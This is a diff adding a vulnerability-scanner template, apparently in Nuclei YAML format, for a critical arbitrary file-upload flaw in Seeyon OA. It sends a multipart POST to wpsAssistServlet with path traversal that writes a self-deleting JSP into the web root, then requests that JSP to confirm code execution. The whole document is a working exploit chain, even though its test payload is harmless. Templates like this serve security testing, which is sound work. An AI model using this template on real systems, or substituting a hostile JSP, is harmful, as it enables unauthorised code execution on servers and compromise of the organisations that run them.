@@ -1,0 +1,35 @@
+id: yaml-poc-seeyon-seeyon_oa-file_upload-CT-469699
+info:
+  name: Yaml Poc Seeyon Seeyon_Oa File_Upload Ct 469699
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-seeyon-seeyon_oa-file_upload-CT-469699'
+  tags: fileupload
+  reference: []
+http:
+- method: POST
+  path:
+  - /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{s2}}.jsp&fileId=2
+  body: "--59229605f98b8cf290a7b8908b34616b\r\nContent-Disposition: form-data; name=\"\
+    upload\"; filename=\"123.xls\"\r\nContent-Type: application/vnd.ms-excel\r\n\r\
+    \n<% out.println(\"{{s1}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete();\
+    \ %>\r\n--59229605f98b8cf290a7b8908b34616b--"
+  headers:
+    Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - success
+- method: GET
+  path:
+  - /{{s2}}.jsp
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
